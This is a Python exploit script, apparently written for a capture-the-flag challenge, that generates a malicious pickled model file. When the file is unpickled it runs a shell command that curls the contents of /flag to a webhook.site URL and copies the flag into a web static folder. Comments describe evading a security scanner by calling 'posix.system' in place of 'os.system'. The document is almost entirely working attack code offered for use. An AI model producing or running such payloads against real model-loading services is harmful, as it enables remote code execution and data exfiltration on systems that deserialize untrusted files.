import pickle
import sys
import os

# CONFIGURATION
# =============
# Get a webhook URL from https://webhook.site/
# Replace the URL below with your unique URL.
WEBHOOK_URL = "https://webhook.site/2836268e-59ee-4f9e-a0e7-8b02441c2a11" 
# (I've put a placeholder or you can use your own if you have one active)

# PAYLOAD COMMAND
# ===============
# 1. Try to curl the flag to the webhook.
# 2. Try to copy the flag to a static file (in case webroot is writable).
CMD = f"curl -X POST -d \"$(cat /flag)\" {WEBHOOK_URL}; cp /flag /app/static/flag.txt"

# WINDOWS POSIX MOCK
# ==================
# This is necessary to generate a payload on Windows that works on Linux.
# The security scanner blocks 'os.system' but usually misses 'posix.system'.
if 'posix' not in sys.modules:
    from types import ModuleType
    sys.modules['posix'] = ModuleType('posix')

def system(cmd):
    pass

# Mock the function so pickle saves it as 'posix.system'
system.__module__ = 'posix'
system.__name__ = 'system'
system.__qualname__ = 'system'
sys.modules['posix'].system = system

class MaliciousModel(object):
    def __reduce__(self):
        # The arguments to posix.system
        return (system, (CMD,))

if __name__ == "__main__":
    output_file = "nailong_payload.pth"
    with open(output_file, 'wb') as f:
        pickle.dump(MaliciousModel(), f)
    print(f"[+] Generated {output_file}")
    print(f"[+] Payload: {CMD}")
    print("[!] Please upload this file to the CTF website.")
    print("[!] Then check your webhook for the flag.")
    print("[!] Also try accessing http://1.95.143.126:8501/static/flag.txt")
